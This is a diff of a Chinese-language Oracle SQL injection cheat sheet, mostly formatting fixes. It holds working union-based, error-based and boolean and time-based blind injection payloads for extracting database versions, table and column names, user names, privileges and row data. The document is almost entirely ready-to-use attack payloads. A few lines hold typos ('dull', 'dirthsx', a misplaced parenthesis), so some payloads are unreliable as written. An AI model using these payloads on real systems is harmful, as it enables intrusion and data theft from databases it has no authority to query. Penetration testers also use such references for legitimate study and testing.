@@ -93,49 +93,36 @@ Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加�
 `' union select 'null',null,null from dual -- 每个位置加单引号，观察是否报错。`
 
 **Step 4.**获取数据库版本信息：
-
 `' union select null,(select banner from sys.v$version where rownum=1),null from dual --`
 
 **Step 5.**获取表名：
-
 `' union select null,(select table_name from user_tables where rownum=1),null from dual --`
-
 `' union select null,(select table_name from user_tables where rownum=1 and table_name<>'table_1'),null from dual --`
 
 **Step 6.**获取列名：
-
 `' union select null,(select column_name from user_tab_columns where table_name='table_1' and rownum=1),null from dual --`
-
 `' union select null,(select column_name from user_tab_columns where table_name='table_1' and column_name<>'column_1' and rownum=1),null from dual --`
 
 **Step 7.**获取数据：
-
 `' union select null,(select column_1，column_2，column_3 from table_1 where rownum=1),null from dual --`
 
 拼接：
-
 `' union select null,(select column_1||','||column_2||','||column_3 from table_1 where rownum=1),null from dual -- 拼接多个字段用到的连接符号是 "||"。在 Oracle 中，concat() 函数只能连接两个字符串。`
 
 **Other 1.**：获取当前数据库名：
-
 `' union select null,(select sys.database_name from dull),null from dual --`
 
 **Other 2.**：爆数据库名：
-
 `' union select null,(select DISTINCT owner from all_tables where rownum=1),null from dual --`
 
 **Other 3.**：获取当前用户名：
-
 `' union select null,(select user from dull),null from dual --`
 
 **Other 4.**：爆用户名：
-
 `' union select null,(select username from all_users where rownum=1),null from dual --`
-
 `' union select null,(select user from sys.user$ where rownum=1),null from dual -- 需要高权限。`
 
 **Other 5.**：查看权限：
-
 `' union select null,(select * from session_privs where rownum=1),null from dual --`
 
 > 参考链接：http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
@@ -149,37 +136,29 @@ Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加�
 常用函数：
 
 **utl_inaddr.get_host_name()**
-
 `' and 1=utl_inaddr.get_host_name((select user from dual))-- `
 
 **ctxsys.drithsx.sn()**
-
 `' and 1=ctxsys.dirthsx.sn(1,(select user from dual))-- `
 
 **XMLType()**
-
 `' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null-- `
 
 > 注：1 = [报错语句] 和 [报错语句] is not null 均可。
 
 **dbms_xdb_version.makeversioned()**
-
 `' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null-- `
 
 **dbms_xdb_version.checkin()**
-
 `' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- `
 
 **dbms_xdb_version.uncheckout()**
-
 `' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null-- `
 
 **dbms_utility.sqlid_to_sqlhash()**
-
 `' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null-- `
 
 **ordsys.ord_dicom.getmappingxpath()**
-
 `' and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)-- `
 
 **dbms_xmltranslations.extractxliff**
@@ -195,7 +174,6 @@ Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加�
 如果页面没有报错，但是可以通过页面返回是否正常来判断 SQL 语句是否被执行，此时可以尝试布尔型盲注。主要通过 ASCII()、substr() 等组合判断来获取数据。
 
 **decode()**
-
 `' and 1=(select decode(substr(user,$1$,1),'$A$',1,0) from dual)-- `
 
 该语句表示，如果 user 的第一位的值是 'A'，则返回1，否则返回0。
@@ -235,7 +213,6 @@ decode(参数1， 参数2，参数3，参数4，...， 参数n)
 ```
 
 **instr()**
-
 `' and 1=(instr((select user from dual),'SYS'))`
 
 该语句表示，如果在 user 中存在 'SYS'，则返回 'SYS' 在字符串中的位置，否则则返回0。
@@ -280,8 +257,6 @@ select count(\*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, AL
 ' and 1=(select count(*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) and '1'='1
 
 如果返回包发生时延，则可能存在注入点。
-
-
 ```
 
 **获取数据**
@@ -292,7 +267,8 @@ select count(\*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, AL
 ' and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1
 
 如果发生时延，则 user 的第一位是 'S'。
-
+```
+```
 配合 case
 
 ' and 1=(case when (ASCII(substr(select user from dual),1,1)<96) then (select count(*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) else 1 end) and '1'='1'
